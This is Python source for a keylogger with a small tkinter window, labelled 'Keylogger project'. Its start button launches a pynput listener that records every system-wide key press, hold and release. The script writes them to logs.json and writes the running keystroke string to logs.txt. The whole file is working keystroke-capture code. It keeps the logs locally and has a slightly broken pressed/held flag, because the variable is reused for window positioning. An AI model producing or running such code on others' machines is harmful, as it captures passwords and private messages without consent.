import tkinter as tk
from pynput import keyboard
import json

root = tk.Tk()
root.geometry("350x400")
root.title("Keylogger project")
root.configure(bg="cyan")

key_list = []
x = False
key_strokes = ""

def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json', 'w', encoding='utf-8') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes + str(key)
    update_txt_file(str(key_strokes))

def butaction():
    print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in 'logs.json'")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

empty = tk.Label(root, text="KeyLogger", font='Verdana 15 bold')
empty.pack(pady=40)

start_button = tk.Button(root, text="Start KeyLogger", command=butaction)
start_button.pack()

# Center-align the GUI elements both horizontally and vertically
root.update_idletasks()
x = (root.winfo_screenwidth() - root.winfo_reqwidth()) // 2
y = (root.winfo_screenheight() - root.winfo_reqheight()) // 2
root.geometry("+{}+{}".format(x, y))

root.mainloop()
